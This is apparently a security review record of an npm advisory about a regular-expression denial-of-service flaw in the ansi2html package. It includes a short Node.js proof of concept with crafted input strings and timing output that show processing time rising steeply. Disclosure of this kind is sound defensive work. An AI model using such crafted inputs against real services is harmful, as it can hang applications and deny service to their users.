---
Publication-State: Active
Access: Public
Reviewers:
- Name: Adam Baldwin
  Associated-With-Project: false
  Compensation-Source: external
Domain: Security
Methodology:
- Code-Review
Issues-Identified: Not-Examined
Package-URLs:
- pkg:npm/ansi2html
Review-Date: '2015-10-25'
Scope: Implementation/Full
Schema-Version: '1.0'
SPDX-License-Identifier: CC-BY-4.0
---
### Summary
*Regular Expression Denial of Service*<br><br>There is currently no available fix. Do not pass untrusted input into ansi2html or limit the size of the user input to limit input.
### Details
ansi2html is vulnerable to regular expression denial of service (ReDoS) when certain types of user input is passed in.  "The Regular expression Denial of Service (ReDoS) is a Denial of Service attack, that exploits the fact that most Regular Expression implementations may reach extreme situations that cause them to work very slowly (exponentially related to input size). An attacker can then cause a program using a Regular Expression to enter these extreme situations and then hang for a very long time." [1]  ###Proof of concept ``` var ansi2html = require('ansi2html')  var start = process.hrtime(); ansi2html("[1111111111111111111111;0000000000000000000000"); console.log(process.hrtime(start));  start = process.hrtime(); ansi2html("[1111111111111111111111;00000000000000000000000"); console.log(process.hrtime(start));  start = process.hrtime(); ansi2html("[1111111111111111111111;000000000000000000000000"); console.log(process.hrtime(start));  start = process.hrtime(); ansi2html("[1111111111111111111111;0000000000000000000000000000"); console.log(process.hrtime(start)); ```  Results of the above ``` 00:29:53-adam_baldwin~/tmp$ node test [ 0, 119615367 ] [ 0, 149934565 ] [ 0, 233325677 ] [ 3, 46582479 ] ```
<br><br>• Affected Versions: <=99.999.99999
<br>• Patched Versions: <0.0.0
### Methodology
This review was taken directly from the Security Advisories section of npm's official website.
### External References
['https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS']
### Disclaimer
All security reviews are conducted on a "best-effort" basis against a software component at a point in time. We make no guarantee as to the quality or completeness of any review. If you believe any content is inaccurate, we encourage you to open an issue or submit a pull request with a correction or improvement.
### License
This text is released under at least the [Creative Commons Attribution 4.0 (CC-BY-4.0) license](https://creativecommons.org/licenses/by/4.0/legalcode.txt). Externally-referenced content may be licensed differently.
